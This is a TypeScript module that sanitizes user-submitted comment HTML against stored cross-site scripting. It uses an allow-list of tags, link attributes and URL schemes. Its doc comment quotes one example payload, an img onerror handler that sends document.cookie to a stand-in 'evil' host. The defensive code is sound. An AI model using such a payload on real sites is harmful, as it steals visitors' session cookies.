import sanitizeHtml from 'sanitize-html';

/**
 * Comment bodies are HTML written by users and later rendered with dangerouslySetInnerHTML.
 * Without this, a comment like <img src=x onerror="fetch('//evil?c='+document.cookie)"> runs
 * in every viewer's browser (stored XSS).
 *
 * An ALLOW-list (not a block-list): only the tags the editor can produce survive, every attribute
 * not listed is dropped (so no onclick / onerror / style), and links may only be http(s) or mailto
 * (so no javascript: URLs). Images are not allowed until attachments exist (4.2).
 */
const OPTIONS: sanitizeHtml.IOptions = {
  allowedTags: ['p', 'br', 'strong', 'em', 's', 'u', 'code', 'pre', 'blockquote', 'ul', 'ol', 'li', 'a', 'h3', 'hr'],
  // target/rel are listed because transformTags (below) runs BEFORE attributes are filtered
  allowedAttributes: { a: ['href', 'target', 'rel'] },
  allowedSchemes: ['http', 'https', 'mailto'],
  // every surviving link opens in a new tab and can't reach back into our page (overrides whatever was sent)
  transformTags: {
    a: sanitizeHtml.simpleTransform('a', { target: '_blank', rel: 'noopener noreferrer nofollow' }),
  },
  disallowedTagsMode: 'discard',
};

export function sanitizeComment(html: string) {
  return sanitizeHtml(html, OPTIONS);
}

/** True when the HTML has no visible text (e.g. "<p></p>" or "<p> </p>"). */
export function isBlankHtml(html: string) {
  return sanitizeHtml(html, { allowedTags: [], allowedAttributes: {} }).replace(/&nbsp;/g, ' ').trim() === '';
}
